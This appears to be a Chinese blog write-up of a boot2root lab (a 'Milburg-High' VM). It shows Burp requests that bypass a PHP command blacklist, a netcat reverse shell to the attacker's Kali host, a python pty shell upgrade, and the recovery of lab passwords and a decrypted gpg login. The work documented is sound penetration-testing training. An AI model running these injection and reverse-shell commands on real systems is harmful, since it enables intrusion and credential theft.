-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104162504862.png" class="" title="image-20240104162504862">
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104142417794.png" class="" title="image-20240104142417794">
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104164728109.png" class="" title="image-20240104164728109">
-<p>在dev.shell.php页面输入ls(之前不让访问的命令)，然后在BP中抓包，将抓到的包send to Repeater模块（重放模块），然后点击intercept is on，即关闭拦截抓包，这样dev.shell.php页面就能接收到先前输入的ls，对方网页也就不会发现异常了。之后点击repeater模块的send按钮，得到response。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /dev_shell.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.233.138</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 13</span><br><span class="line"></span><br><span class="line">Origin: http://192.168.233.138</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Referer: http://192.168.233.138/dev_shell.php</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">in_command=ls</span><br></pre></td></tr></table></figure>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">Date: Thu, 04 Jan 2024 06:26:16 GMT</span><br><span class="line"></span><br><span class="line">Server: Apache/2.4.25 (Debian)</span><br><span class="line"></span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line"></span><br><span class="line">Content-Length: 675</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">    #back&#123;</span><br><span class="line">      position: fixed;</span><br><span class="line">      top: 0;</span><br><span class="line">      left: 0;</span><br><span class="line">      min-width: 100%;</span><br><span class="line">      min-height: 100%;</span><br><span class="line">      z-index:-10</span><br><span class="line">    &#125;</span><br><span class="line">      #shell&#123;</span><br><span class="line">        color: white;</span><br><span class="line">        text-align: center;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">  &lt;!-- WIP, don&#x27;t forget to report any bugs we don&#x27;t want another breach guys</span><br><span class="line">  -Bob --&gt;</span><br><span class="line">  &lt;div id=&quot;shell&quot;&gt;</span><br><span class="line">    &lt;h2&gt;</span><br><span class="line">      dev_shell</span><br><span class="line">    &lt;/h2&gt;</span><br><span class="line">    &lt;form action=&quot;dev_shell.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">      Command: &lt;input type=&quot;text&quot; name=&quot;in_command&quot; /&gt; &lt;br&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;h5&gt;Output:&lt;/h5&gt;</span><br><span class="line">    Get out skid lol</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">    &lt;img src=&quot;dev_shell_back.png&quot; id=&quot;back&quot; alt=&quot;&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>尝试绕过网站安全机制，猜测网站使用了命令拦截，可以在response中看到黑名单（会拦截的命令）。ls在根下的bin目录中，因此尝试将<code>in_command</code>即输入的命令更改为<code>/bin/ls</code>（通过篡改命令潜入对方网站），此时可以看到web根目录下所有的网页内容，基于此，我们搜集有用内容（<code>php</code>页面包含信息更多，<code>.bak</code>后缀通常为备份文件）。</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /dev_shell.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.233.138</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 18</span><br><span class="line"></span><br><span class="line">Origin: http://192.168.233.138</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Referer: http://192.168.233.138/dev_shell.php</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">in_command=/bin/ls</span><br></pre></td></tr></table></figure>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">Date: Thu, 04 Jan 2024 06:35:48 GMT</span><br><span class="line"></span><br><span class="line">Server: Apache/2.4.25 (Debian)</span><br><span class="line"></span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line"></span><br><span class="line">Content-Length: 845</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">    <span class="comment">#back&#123;</span></span><br><span class="line">      position: fixed;</span><br><span class="line">      top: 0;</span><br><span class="line">      left: 0;</span><br><span class="line">      min-width: 100%;</span><br><span class="line">      min-height: 100%;</span><br><span class="line">      z-index:-10</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">#shell&#123;</span></span><br><span class="line">        color: white;</span><br><span class="line">        text-align: center;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">  &lt;!-- WIP, don<span class="string">&#x27;t forget to report any bugs we don&#x27;</span>t want another breach guys</span><br><span class="line">  -Bob --&gt;</span><br><span class="line">  &lt;div <span class="built_in">id</span>=<span class="string">&quot;shell&quot;</span>&gt;</span><br><span class="line">    &lt;h2&gt;</span><br><span class="line">      dev_shell</span><br><span class="line">    &lt;/h2&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;dev_shell.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">      Command: &lt;input <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;in_command&quot;</span> /&gt; &lt;br&gt;</span><br><span class="line">      &lt;input <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;h5&gt;Output:&lt;/h5&gt;</span><br><span class="line">    WIP.jpg</span><br><span class="line">about.html</span><br><span class="line">contact.html</span><br><span class="line">dev_shell.php</span><br><span class="line">dev_shell.php.bak</span><br><span class="line">dev_shell_back.png</span><br><span class="line">index.html</span><br><span class="line">index.html.bak</span><br><span class="line">lat_memo.html</span><br><span class="line">login.html</span><br><span class="line">news.html</span><br><span class="line">passwords.html</span><br><span class="line">robots.txt</span><br><span class="line">school_badge.png</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">    &lt;img src=<span class="string">&quot;dev_shell_back.png&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;back&quot;</span> alt=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>下载<code>bak</code>文件并查看<code>vim dev_shell.php.bak</code></p>
-<blockquote>
-<p>dev_shell.php.bak</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">//init</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">invalid = 0;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="built_in">command</span> = (<span class="variable">$_POST</span>[<span class="string">&#x27;in_command&#x27;</span>]);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">bad_words = array(<span class="string">&quot;pwd&quot;</span>, <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;netcat&quot;</span>, <span class="string">&quot;ssh&quot;</span>, <span class="string">&quot;wget&quot;</span>, <span class="string">&quot;ping&quot;</span>, <span class="string">&quot;traceroute&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;nc&quot;</span>);</span></span><br><span class="line">?&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">back&#123;</span></span><br><span class="line">position: fixed;</span><br><span class="line">top: 0;</span><br><span class="line">left: 0;</span><br><span class="line">min-width: 100%;</span><br><span class="line">min-height: 100%;</span><br><span class="line">z-index:-10</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">shell&#123;</span></span><br><span class="line">color: white;</span><br><span class="line">text-align: center;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div id=&quot;shell&quot;&gt;</span><br><span class="line">&lt;h2&gt;</span><br><span class="line">dev_shell</span><br><span class="line">&lt;/h2&gt;</span><br><span class="line">&lt;form action=&quot;dev_shell.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">Command: &lt;input type=&quot;text&quot; name=&quot;in_command&quot; /&gt; &lt;br&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;h5&gt;Output:&lt;/h5&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">system(&quot;running command...&quot;);</span><br><span class="line">//executes system Command</span><br><span class="line">//checks for sneaky ;</span><br><span class="line">if (strpos($command, &#x27;;&#x27;) !==false)&#123;</span><br><span class="line">system(&quot;echo Nice try skid, but you will never get through this bulletproof php code&quot;); //doesn&#x27;t work :P</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">is_he_a_bad_man = explode(<span class="string">&#x27; &#x27;</span>, trim(<span class="variable">$command</span>));</span></span><br><span class="line">//checks for dangerous commands</span><br><span class="line">if (in_array($is_he_a_bad_man[0], $bad_words))&#123;</span><br><span class="line"> system(&quot;echo Get out skid lol&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line"><span class="meta prompt_"> system($</span><span class="language-bash">_POST[<span class="string">&#x27;in_command&#x27;</span>]);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;img src=&quot;dev_shell_back.png&quot; id=&quot;back&quot; alt=&quot;&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-</blockquote>
-<p><strong>代码审计</strong>：根据代码审计发现黑名单，发现nc被过滤了，可以尝试绕过黑名单</p>
-<p><strong>反弹shell</strong>：之前网站页面内容中有透露网页存在shell且做了加固。因此我们需要提升权限，使用工具<code>nc</code>反弹shell，在抓包工具BP页面将输入更改为/<code>bin/nc -e /bin/bash 192.168.244.132 8888</code>，该IP为Kali的IP，因为我们需要让网页向Kali发送response，send一下，在命令行中查收结果，此时反弹shell成功，可以查看ls等黑名单中的命令。使用命令id可以看到我们拿到了用户<code>www-data</code>的shell。</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7777</span><br><span class="line"></span><br><span class="line">in_command=/bin/nc -e /bin/bash 192.168.233.135 7777</span><br></pre></td></tr></table></figure>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104144346262.png" class="" title="image-20240104144346262">
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nc -lvvp 7777</span></span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line">192.168.233.138: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.233.135] from (UNKNOWN) [192.168.233.138] 50180</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">WIP.jpg</span><br><span class="line">about.html</span><br><span class="line">contact.html</span><br><span class="line">dev_shell.php</span><br><span class="line">dev_shell.php.bak</span><br><span class="line">dev_shell_back.png</span><br><span class="line">index.html</span><br><span class="line">index.html.bak</span><br><span class="line">lat_memo.html</span><br><span class="line">login.html</span><br><span class="line">news.html</span><br><span class="line">passwords.html</span><br><span class="line">robots.txt</span><br><span class="line">school_badge.png</span><br><span class="line"><span class="built_in">id</span> </span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data),100(<span class="built_in">users</span>)</span><br></pre></td></tr></table></figure>
-<p><strong>进入交互式shell</strong>：使用Python的模块调用bash，前提是目标靶机有Python</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104145017010.png" class="" title="image-20240104145017010">
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104145328639.png" class="" title="image-20240104145328639">
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span>/</span><br><span class="line">bash: <span class="built_in">cd</span>/: No such file or directory</span><br><span class="line">www-data@Milburg-High:/var/www/html$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">WIP.jpg        dev_shell.php.bak   lat_memo.html   robots.txt</span><br><span class="line">about.html     dev_shell_back.png  login.html      school_badge.png</span><br><span class="line">contact.html   index.html          news.html</span><br><span class="line">dev_shell.php  index.html.bak      passwords.html</span><br><span class="line">www-data@Milburg-High:/var/www/html$ <span class="built_in">cat</span> flag.txt </span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br><span class="line"><span class="built_in">cat</span>: flag.txt: No such file or directory</span><br><span class="line">www-data@Milburg-High:/var/www/html$ <span class="built_in">cd</span> ../../</span><br><span class="line"><span class="built_in">cd</span> ../../</span><br><span class="line">www-data@Milburg-High:/var$ <span class="built_in">cd</span> ../</span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line">www-data@Milburg-High:/$ <span class="built_in">ls</span> -a</span><br><span class="line"><span class="built_in">ls</span> -a</span><br><span class="line">.    boot  flag.txt    initrd.img.old  lost+found  opt   run   sys  var</span><br><span class="line">..   dev   home        lib             media       proc  sbin  tmp  vmlinuz</span><br><span class="line">bin  etc   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old</span><br><span class="line">www-data@Milburg-High:/$ <span class="built_in">cat</span> flag.txt</span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br><span class="line"><span class="built_in">cat</span>: flag.txt: Permission denied</span><br></pre></td></tr></table></figure>
-<p>浏览根目录文件找到flag.txt，flag.txt只有管理员有读写权限，so我们需要拿到管理员权限。在<code>etc</code>目录下发现了文件passwd，查看该文件，文件中包含用户名信息，其中就有Bob用户，通过网站页面信息了解到Bob可能是管理员。因此紧接着浏览bob的家目录，发现隐藏敏感文件<code>.old_passwordfile.html</code>，查看该文件发现了<code>jc</code>和<code>seb</code>的账号密码。</p>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104160041914.png" class="" title="image-20240104160041914">
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">www-data@Milburg-High:/home/bob$ cat .old_passwordfile.html</span><br><span class="line">cat .old_passwordfile.html</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;</span><br><span class="line">jc:Qwerty</span><br><span class="line">seb:T1tanium_Pa$$word_Hack3rs_Fear_M3</span><br><span class="line">&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104160633573.png" class="" title="image-20240104160633573">
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">jc@Milburg-High:/home/bob$ <span class="built_in">cd</span> /home/bob/</span><br><span class="line"><span class="built_in">cd</span> /home/bob/</span><br><span class="line">jc@Milburg-High:/home/bob$ <span class="built_in">ls</span> -l</span><br><span class="line"><span class="built_in">ls</span> -l</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Desktop</span><br><span class="line">drwxr-xr-x 3 bob bob 4096 Mar  5  2018 Documents</span><br><span class="line">drwxr-xr-x 3 bob bob 4096 Mar  8  2018 Downloads</span><br><span class="line">drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Music</span><br><span class="line">drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Pictures</span><br><span class="line">drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Public</span><br><span class="line">drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Templates</span><br><span class="line">drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Videos</span><br><span class="line">jc@Milburg-High:/home/bob$ <span class="built_in">cd</span> Documents</span><br><span class="line"><span class="built_in">cd</span> Documents</span><br><span class="line">jc@Milburg-High:/home/bob/Documents$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">login.txt.gpg  Secret  staff.txt</span><br><span class="line">jc@Milburg-High:/home/bob/Documents$ <span class="built_in">cat</span> login.txt.gpg</span><br><span class="line"><span class="built_in">cat</span> login.txt.gpg</span><br><span class="line">o��J[V0w�q�OS����@P�i4��u</span><br><span class="line">                         E,����8=kj�Z����9`�5G��4��!�����!�����Q:�1���Q�jc@Milburg-High:/home/bob/Documents$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><strong>解密<code>gpg</code>文件</strong><br>登上<code>jc</code>账号，浏览其家目录，没找到有用信息，保持旺盛的好奇心，浏览对方所有文件，搜集有用信息，最终我们在Bob家目录的documents中找到了文件<code>login.txt.gpg</code>（<code>gpg</code>是<code>linux</code>的加密格式），需要将该文件解密后查看。<br>解密<code>gpg</code>文件：查看Bob家目录的documents中的Secret文件夹，发现了文件<code>notes.sh</code>（<code>sh</code>后缀为<code>linux</code>下的shell脚本文件）查看该内容后开始猜测其含义，最终确定这是藏头诗，找到了密钥（<strong>HARPOCRATES</strong>），破解文件<code>login.txt.gpg</code>，并查看该文件内容。</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;uments/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">notes.sh</span><br><span class="line">&lt;uments/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ ./notes.sh</span><br><span class="line">./notes.sh</span><br><span class="line">TERM environment variable not <span class="built_in">set</span>.</span><br><span class="line">-= Notes =-</span><br><span class="line">Harry Potter is my faviorite</span><br><span class="line">Are you the real me?</span><br><span class="line">Right, I<span class="string">&#x27;m ordering pizza this is going nowhere</span></span><br><span class="line"><span class="string">People just don&#x27;</span>t get me</span><br><span class="line">Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh &lt;sea santy here&gt;</span><br><span class="line">Cucumber</span><br><span class="line">Rest now your eyes are sleepy</span><br><span class="line">Are you gonna stop reading this yet?</span><br><span class="line">Time to fix the server</span><br><span class="line">Everyone is annoying</span><br><span class="line">Sticky notes gotta buy em</span><br><span class="line">&lt;uments/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ </span><br></pre></td></tr></table></figure>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104155409288.png" class="" title="image-20240104155409288">
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --batch --passphrase HARPOCRATES -d login.txt.gpg</span><br></pre></td></tr></table></figure>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jc@Milburg-High:/home/bob/Documents$ gpg --batch --passphrase HARPOCRATES -d login.txt.gpg</span><br><span class="line">&lt;g --batch --passphrase HARPOCRATES -d login.txt.gpg</span><br><span class="line">gpg: keybox <span class="string">&#x27;/home/jc/.gnupg/pubring.kbx&#x27;</span> created</span><br><span class="line">gpg: AES encrypted data</span><br><span class="line">gpg: encrypted with 1 passphrase</span><br><span class="line">bob:b0bcat_</span><br><span class="line">jc@Milburg-High:/home/bob/Documents$</span><br></pre></td></tr></table></figure>
- <img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104161606959.png" class="" title="image-20240104161606959">
